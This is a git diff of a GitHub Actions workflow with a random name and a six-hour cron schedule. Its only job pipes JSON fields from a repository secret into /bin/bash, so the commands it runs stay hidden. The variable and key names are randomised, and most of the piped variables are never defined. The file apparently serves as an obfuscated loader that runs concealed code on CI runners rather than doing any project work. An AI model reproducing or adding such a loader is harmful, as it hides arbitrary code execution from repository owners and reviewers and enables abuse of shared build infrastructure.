@@ -1,8 +1,10 @@
 name: gregariousbiathlon
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 4/6 * * *'
+    - cron: '34 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,16 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: gregariousbiathlon
         env:
-          iwiwt059: ${{ secrets.iwiwt059 }}
+          yjw44: ${{ secrets.yjw44 }}
         run: |
-          echo $iwiwt059 | jq -r .ctrri86 | /bin/bash
-          echo $isfzp996 | jq -r .ikv02213 | /bin/bash
-          echo $c12274 | jq -r .cew73 | /bin/bash
-          echo $jkqct64 | jq -r .fc16 | /bin/bash
-          echo $p2 | jq -r .ijpqx68996 | /bin/bash
-          echo $t18 | jq -r .rc19156 | /bin/bash
-          echo $n51140 | jq -r .ic9 | /bin/bash
-          echo $nbe79369 | jq -r .t8822 | /bin/bash
-          echo $isf85396 | jq -r .toq6119 | /bin/bash
-          echo $dlzc88 | jq -r .iwfas8 | /bin/bash
+          echo $yjw44 | jq -r .w3 | /bin/bash
+          echo $r23 | jq -r .brryf7493 | /bin/bash
+          echo $nq817 | jq -r .xzbnv65275 | /bin/bash
+          echo $xqyzo60 | jq -r .lm0 | /bin/bash
+          echo $tg16 | jq -r .ntoh41701 | /bin/bash
+          echo $whmkn00972 | jq -r .tusgb40 | /bin/bash
+          echo $lb9 | jq -r .z63 | /bin/bash
+          echo $biofy06282 | jq -r .r1 | /bin/bash
+          echo $mrcyt84 | jq -r .oz63493 | /bin/bash
+          echo $cy424 | jq -r .pcm25552 | /bin/bash
+          echo $tr994 | jq -r .em1163 | /bin/bash
+          echo $whxh6045 | jq -r .jwni2 | /bin/bash
+          echo $kmpo080 | jq -r .jv6420 | /bin/bash
 
